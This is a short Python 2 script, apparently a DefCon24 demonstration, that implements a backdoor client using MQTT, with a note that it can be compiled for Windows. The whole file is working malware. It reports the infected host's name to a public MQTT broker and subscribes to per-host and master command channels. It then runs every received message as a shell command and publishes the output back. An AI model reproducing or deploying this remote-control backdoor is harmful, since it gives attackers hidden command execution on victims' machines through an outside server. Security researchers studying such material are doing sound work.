#!/bin/python2

## MQTT BACKDOOR CLIENT, CAN BE COMPILE with Py2exe Windows ###
## Lucas Lundgren DefCon24


#### SETUP #####

### Set the master channel
master="backdoor/master"  # this is where your commands affect everyone
online="backdoor/online"

import paho.mqtt.client as mqtt
import os
import socket
import subprocess
computer="hostname"
hostname = subprocess.check_output(computer, shell=True).rstrip('\r\n')
subthis="backdoor/"+hostname.rstrip('\r\n')

# print subthis
# userdata, flags,
### Parts of this code was borrowed from the Paho examples ####

def on_connect(client, userdata,flags,rc):
    print("Connected with result code "+str(rc))
    print ("Identifying myself to the master...") 	
    client.publish(online,hostname+":What is thy bidding my master...")
### send hello before listening in... ###
    client.publish(subthis+"/getcmd", "hello there...")
    client.subscribe(subthis+"/getcmd")
### Subscribe to the master channel ###
    client.subscribe(master)
   
# The callback for when a PUBLISH message is received from the server.
def on_message(client, userdata, msg):
    #print(msg.payload)
	#os.system(msg.payload)
	#x = subprocess.check_output([msg.payload])
	# print "Ex is:"+x
	a=os.popen(msg.payload).read()	
	print a
	client.publish(subthis+"/sendcmd",a)
	#print(msg)	
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

client.connect("iot.eclipse.org",1883,60)

# Blocking call that processes network traffic, dispatches callbacks and
# handles reconnecting.
# Other loop*() functions are available that give a threaded interface and a
# manual interface.
client.loop_forever()
